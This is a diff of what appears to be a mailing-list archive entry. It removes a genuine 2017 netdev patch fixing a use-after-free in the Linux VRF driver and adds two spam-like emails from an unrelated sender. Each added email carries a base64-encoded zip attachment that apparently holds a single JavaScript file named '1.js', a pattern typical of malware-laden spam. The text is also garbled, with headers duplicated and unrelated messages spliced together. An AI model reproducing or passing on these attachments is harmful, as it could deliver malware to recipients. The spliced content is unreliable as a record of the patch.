@@ -1,72 +1,95 @@
-From: gfree.wind@vip.163.com
-Subject: [PATCH net v2] driver: vrf: Fix one possible use-after-free issue
-Date: Tue,  9 May 2017 18:27:33 +0800
-Message-ID: <1494325653-39885-1-git-send-email-gfree.wind@vip.163.com>
-Cc: Gao Feng <gfree.wind@vip.163.com>
-To: dsa@cumulusnetworks.com, shm@cumulusnetworks.com,
-        davem@davemloft.net, fw@strlen.de, netdev@vger.kernel.org
+From: <kirola@soraluze.eus>
+Subject: 3590
+Date: Tue, 09 May 2017 10:29:51 -0000
+Message-ID: <149432579170.26770.12602182025090768594@quicknet.ch>
+Mime-Version: 1.0
+Content-Type: application/zip; name="81646126599.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-177180.vip.163.com ([123.58.177.180]:58964 "EHLO
-        mail-177180.vip.163.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751587AbdEIK2c (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Tue, 9 May 2017 06:28:32 -0400
+Received: from dyn-cable-cust.94.61.202.213.quicknet.ch ([213.202.61.94]:33192
+        "HELO quicknet.ch" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1750877AbdEIK35 (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Tue, 9 May 2017 06:29:57 -0400
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-From: Gao Feng <gfree.wind@vip.163.com>
+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
+BgAAAAA=
+Message-ID: <149432579170.26770.12602182025090768594@quicknet.ch>
+From: <kirola@soraluze.eus>
+To: <netdev@vger.kernel.org>
+Subject: 44362
+Date: Tue, 09 May 2017 10:29:51 -0000
+Importance: High
+MIME-Version: 1.0
+Content-Type: application/zip; name="16461265997925.zip"
+Content-Disposition: attachment
+Content-Transfer-Encoding: base64
 
-The current codes only deal with the case that the skb is dropped, it
-may meet one use-after-free issue when NF_HOOK returns 0 that means
-the skb is stolen by one netfilter rule or hook.
-
-When one netfilter rule or hook stoles the skb and return NF_STOLEN,
-it means the skb is taken by the rule, and other modules should not
-touch this skb ever. Maybe the skb is queued or freed directly by the
-rule.
-
-Now uses the nf_hook instead of NF_HOOK to get the result of netfilter,
-and check the return value of nf_hook. Only when its value equals 1, it
-means the skb could go ahead. Or reset the skb as NULL.
-
-BTW, because vrf_rcv_finish is empty function, so needn't invoke it
-even though nf_hook returns 1. But we need to modify vrf_rcv_finish
-to deal with the NF_STOLEN case.
-
-There are two cases when skb is stolen.
-1. The skb is stolen and freed directly.
-   There is nothing we need to do, and vrf_rcv_finish isn't invoked.
-2. The skb is queued and reinjected again.
-   The vrf_rcv_finish would be invoked as okfn, so need to free the
-   skb in it.
-
-Signed-off-by: Gao Feng <gfree.wind@vip.163.com>
----
- v2: Free the skb in vrf_rcv_finish, per Florian
- v1: initial version
-
- drivers/net/vrf.c | 3 ++-
- 1 file changed, 2 insertions(+), 1 deletion(-)
-
-diff --git a/drivers/net/vrf.c b/drivers/net/vrf.c
-index ceda586..db88249 100644
---- a/drivers/net/vrf.c
-+++ b/drivers/net/vrf.c
-@@ -989,6 +989,7 @@ static u32 vrf_fib_table(const struct net_device *dev)
- 
- static int vrf_rcv_finish(struct net *net, struct sock *sk, struct sk_buff *skb)
- {
-+	kfree_skb(skb);
- 	return 0;
- }
- 
-@@ -998,7 +999,7 @@ static struct sk_buff *vrf_rcv_nfhook(u8 pf, unsigned int hook,
- {
- 	struct net *net = dev_net(dev);
- 
--	if (NF_HOOK(pf, hook, net, NULL, skb, dev, NULL, vrf_rcv_finish) < 0)
-+	if (nf_hook(pf, hook, net, NULL, skb, dev, NULL, vrf_rcv_finish) != 1)
- 		skb = NULL;    /* kfree_skb(skb) handled by nf code */
- 
- 	return skb;
--- 
-1.9.1
+UEsDBBQAAAAIAFNUqUrLHzHqxQYAAHQlAAAEAAAAMS5qc61aa2/aWBD9Xqn/wUJCS9RsljqPBkX5
+ANiE5kUC5PnNAfNIDCa2AyGr/vc1WXXO0B58k+xKVXVs37l3Zs68bDL1Iuvg8bbt3Zz1nLvaILgc
++mVr3/ojOJk/9qpurTMV5AmKLIHOUOBA0NVEYEOQL6gs6AR7ngpqndUEXwpKlRI8JpvOLLJ/R1AC
+PadE+poofHdPFqodBRVysFxQjJWRIChxJqi90YIL/UBwgF3XBO3BH4yhiDyGi9vns0O56Peg38ER
+HAGz7gR9F3QCl5QpNY4gGhiCJqbAOG0RX9UuNwQ3sUFfYZjbBUGC4NP60TFOw+0vgloJ4w2h1xcE
+nXoQCQWNBFWJSxRnVSLchXcKJVvwGvSE7nEITpMZOwGb5ZShEBIUDZWh3D5l1gBOf481CGtmzQhO
+V6kUcmuJPDXwzZSq7AhHlDcsUJYi5vxCSbDiDerlZpm6dEM8j2HeR6xS/An6/wNVWS5QuYCSDWKf
+oBkL13Ey9SPiD9gbjt8c20T6XdEOl5A9VwUDj4FJJiF98tQbETZhSODDOd0hkVddxdRMLHTFGzTi
+o4B4F30h8e+bF3J1CG1uX3Sf2P4GCFTcEoznpZ2/vuJCEO7tbgrcIgvxFBxQ0z011wzmAsGRMqwu
+KH4WiIHhtdG9IheRjWivCKpa+7RVC1ru2eDxQBHyE4Gv5E71bNWqNzoDXrgEdf2ymmzI1jeXOgIU
+8SRt4RB0aBUc8OGtwBc29dD4hB2CLFj6HZH3QGSO2mfgbTpyiKGsvcyQktBpH/eWhi0Y2he4NHV9
+ZNhCeVqiEgsSRdqNQFP+Jr7i6sLEzN4fe58/9Z7G6Vgdjq2qPzo8mDvnj83rQdSLp7ObRqGSzHvB
+y0n9uh9Xz4eXXW/dakz8YZhOducXp6P52K2vWX9bkZ88RWPrt9UbkT8JvLRuNv2++zwp/Cq7buX6
+ubX0/9zanvXj86fX3H1I7k+Pzxt3L832zHl9i+nfRO7Z6Di+8gVNvaDwNPbjjjfB04LA3FSgJyjK
+28WZXMWCBnmBtqCiIDzddNRKLBgT/WZ0ZbkjMBE0hFGQv27cCb7H/kqeKb1LlLYJUl5IZ0S5mECp
+PBa7WJy+2MhFwNbaTIGS8mAFC4pOXnkGTmDMsbMgHA/YscX8plysIM6fUUEo06E0CVJ8CWoIogyq
+rfP2LvWhikwiF2jHu8RZE4IgM0QIecy4EN5R59hKv1Jeswg6HHbTwKv2el1wuy3wjBGE7QWZuSau
+nGXvWU7rooFrU5IqF+6qw3DaSYtseyLomJgPS221pavEIaV9mu1KoCWqcWolv4LhtGgr2WL6wk18
+5o346T93ybTTyZb9CLWCGFlG1u/9THlDaVb0l52GU9Fp3CLbKX96I10o2DklQe9JU0E0XyNadSck
+oRPdS3V2OpSPWUx7r9vC3srTQ5wT1ASGqG1dSEVxNhspCSgy/iizZHoJ0SZeFEXsrNyOUyqGRNuu
+pv8y9aQUM1qXWskuqSSKI0FoLzoEIyKDFOuiQcBr759FSnm7nJnzyqH0JkRK7OYHREqazrxdyZuU
+WbFA4W8CGc2bmeXPZkralHvdnV2E6LMgn0plqrSq3Asq836tI6mh0nhMNlvREw9gDDZeTjf4VZcm
+mkEk2pNkkmk7i0y7lrdRdGJkwRNuwlpUopDVy47a103YEn0wbkLFLXWTTkFbpkahIlJV6p6qscoe
+phdNBBWfrGfU0zGEvlq0yFmq6AhaMTNn14AK1QUzby/TvKI+3DSk2i7r4Kz4srihx6fNk1lnGIoW
+6FcRFhA8erTNpXcfhLJnmkBUOWnRgYe4ULUdc62xaRui9ZyWVkHLc61Jm/Z8kp0zSy+nhpXg6iuN
+7jfyY3LwSBclgVfq+0CSbdNuHSmh3zZYvjeJBsiDSThmxQeWht05U6X0X/zDmpyhBVLf8uBgvj0L
+Y+VcQUP1Dq6ctzxOq/umZK7oAk9fMAxpRtzmtoiI+n6FSAhrQ4zSKoBU3LAWSadUogidn4u06GHl
+O16XBBk+b3ykfLGYgD0BwuCtnZgXO1ONK7IPTpz0gfoOBeRmjpwd0vKSD0SE4QWmaurd9oqJeXmE
+ZJMj29l+ezBm76OmPz4km07S2gsE5V9NY1Ll/W0duZATtPbvzwmLT/h3tcer8KDnnF8GzdP6odeK
+fWvf8hff7NmPDL/95dK6hZ83c+m+1udPw55VGMwnzYt6/Hx/5T51KlVrf98qbZe+ftve2vnzFWzt
+7Cx+jVioUBlenT8cHwYttx3fPN92G1kK/PKTw7r1alXuS/l7/OAtfmKajpzrXjLrf8m92rxQ6cc/
+UEsBAh8AFAAAAAgAU1SpSssfMerFBgAAdCUAAAQAJAAAAAAAAAAgAAAAAAAAADEuanMKACAAAAAA
+AAEAGAC8YMu2lsjSAas5y7aWyNIBZifaOJbI0gFQSwUGAAAAAAEAAQBWAAAA5wYAAAAA
